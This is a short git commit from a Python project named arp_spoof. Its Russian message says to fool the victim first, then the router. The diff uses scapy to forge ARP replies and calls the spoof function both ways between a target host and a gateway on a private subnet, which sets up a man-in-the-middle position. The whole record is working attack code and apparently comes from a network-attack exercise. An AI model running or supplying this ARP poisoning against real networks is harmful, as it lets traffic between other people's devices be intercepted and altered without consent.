63aff3f871debf1d3c9bbb9c9ff77f92f759aa8c
em0ji <roxi.xyz@gmail.com>
2021-10-04 14:53:23 -0400

    Вызываем функцию spoof. Сначала обманываем жертву? потом роутер

--- arp_spoof/arp_spoof.py
+++ arp_spoof/arp_spoof.py
@@ -16,4 +16,5 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet)
 
-get_mac("10.0.2.1")
+spoof("10.0.2.7", "10.0.2.1")
+spoof("10.0.2.1", "10.0.2.7")
